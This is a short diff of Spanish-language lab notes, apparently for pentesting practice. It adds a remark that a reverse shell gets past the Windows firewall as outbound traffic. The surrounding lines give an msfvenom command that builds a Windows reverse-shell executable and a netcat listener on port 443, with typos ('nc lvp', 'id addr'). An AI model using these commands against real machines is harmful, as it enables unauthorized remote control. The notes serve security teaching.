@@ -4,7 +4,7 @@
 ++ PC2: Firewall de windows apagado
 --- Nota: Aún con el firewall activo el proceso puede llevarse a cabo,
 esto es debido a que el firewall es capaz de bloquear tráfico de entrada más no 
-de salida
+de salida. Este es el caso del reverse shell: el equipo con windows se conecta al equipo con kali (tráfico de salida)
 ++ PC1: msfvenom -p windows/shell_reverse_tcp lhost=<ip_PC1> lport=<443> -f exe > <nombre_programa>
 --- Ubicar ip de PC1 con: id addr show
 ++ PC1: nc lvp 443
